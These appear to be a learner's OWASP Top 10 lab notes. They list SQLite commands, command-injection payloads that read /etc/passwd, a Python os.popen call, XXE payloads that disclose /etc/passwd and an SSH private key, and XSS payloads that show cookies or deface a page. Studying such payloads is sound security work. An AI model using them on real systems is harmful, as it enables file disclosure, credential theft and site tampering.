# ------------------------------------------------------------
#                     OWASP TOP 10 NOTES
# ------------------------------------------------------------

# SQLite Commands

## Start SQLite Prompt

```bash
sqlite3
```

## Show Available Commands

```bash
.help
```

---

# Database File Verification

## Check Whether File is Database or Not

```bash
file example.db
```

Explanation:
- Confirms whether `example.db` is a valid SQLite database file.

---

# Open SQLite Database

```bash
sqlite3 example.db
```

---

# Useful SQLite Commands

## Show Tables

```sql
.tables
```

## Show Table Schema

```sql
.schema tablename
```

## Display All Data from Table

```sql
SELECT * FROM tablename;
```

## Exit SQLite

```sql
.exit
```

# ------------------------------------------------------------
#                    INLINE FUNCTIONS
# ------------------------------------------------------------

## Inline Command Execution Example

```bash
echo "Hello I am $(whoami)"
```

Output Example:

```text
Hello I am kali
```

---

# Useful Linux Commands

```bash
whoami
id
ifconfig
ip addr
uname -a
ps -ef
```

---

# Inline Commands Often Used During Testing

## List Files

```bash
$(ls)
```

## Display User Information

```bash
$(id)
```

## Show OS Information

```bash
$(cat /etc/os-release)
```

## Show System Users

```bash
$(cat /etc/passwd)
```

Explanation:
- Some vulnerable applications execute inline functions.
- Output may reveal sensitive server details.

# ------------------------------------------------------------
#                  PYTHON COMMAND EXECUTION
# ------------------------------------------------------------

## Execute System Command via Python

```python
import os; print(os.popen("ls -l").read())
```

Explanation:
- Executes Linux command using Python.
- Similar to running:

```bash
ls -l
```

# ------------------------------------------------------------
#                        XML PAYLOADS
# ------------------------------------------------------------

# Basic XML Entity Payload

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
<userInfo>
    <firstName>falcon</firstName>
    <lastName>&name;</lastName>
</userInfo>
```

Usage:
- Intercept request in Burp Suite.
- Insert payload into vulnerable XML input.
- Encode payload if necessary using:

```text
CTRL + U
```

---

# XXE Payload for Reading /etc/passwd

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

---

# Reading Other Sensitive Files

Example:

```xml
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
```

Explanation:
- XXE (XML External Entity) attacks allow attackers to read server-side files.

# ------------------------------------------------------------
#            XSS (CROSS SITE SCRIPTING)
# ------------------------------------------------------------

# Reflected XSS Payloads

## Basic Alert Popup

```html
<script>alert("Hello World")</script>
```

---

## Display Hostname / IP

```html
<script>alert(window.location.hostname)</script>
```

Explanation:
- Displays hostname of vulnerable application.

---

# Stored XSS Payloads

## HTML Injection

```html
<h1>Hello World</h1>
```

---

## Attempt to Access Cookies

```html
<script>alert(document.cookie)</script>
```

---

## Modify Webpage Content

```html
<script>
document.querySelector('#thm-title').textContent = 'I am a hacker'
</script>
```

Explanation:
- Changes webpage title dynamically.
- `#thm-title` refers to an HTML element ID found through Inspect Element.

# ------------------------------------------------------------
#                      QUICK SUMMARY
# ------------------------------------------------------------

✔ SQLite Commands  
✔ Inline Function Injection  
✔ Command Execution  
✔ Python OS Command Execution  
✔ XML Payloads  
✔ XXE Injection  
✔ File Disclosure  
✔ Reflected XSS  
✔ Stored XSS  
✔ JavaScript Injection  
✔ HTML Injection  
✔ Burp Suite Testing  

# ------------------------------------------------------------
